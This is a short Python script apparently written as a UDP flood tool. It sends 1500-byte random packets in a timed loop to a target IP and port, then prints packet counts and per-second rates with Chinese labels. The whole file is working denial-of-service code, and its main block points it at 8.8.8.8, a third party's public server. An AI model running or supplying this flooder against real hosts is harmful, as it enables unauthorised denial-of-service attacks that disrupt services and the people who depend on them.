# -*- coding：utf-8 -*-
import socket  # Imports needed libraries
import random
import time


def udpfloods(ip, port, user_input_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creates a socket
    mybyte = random._urandom(1500)
    sent = 0
    print('success')
    st = time.time()
    while 1:
        end = time.time()
        if (end - st) < int(user_input_time):
            sock.sendto(mybyte, (ip, int(port)))
            print("Sent %s amount of packets to %s at port %s." % (sent, ip, port))
            sent = sent + 1
        else:
            print("任务数量:", sent)
            print("总耗时(秒):", user_input_time)
            print("每次请求耗时(秒):", (user_input_time) / (sent))
            print("每秒承载请求数:", 1 / ((user_input_time) / (sent)))
            exit()



if __name__ == '__main__':
    udpfloods('8.8.8.8', '6000', 5)
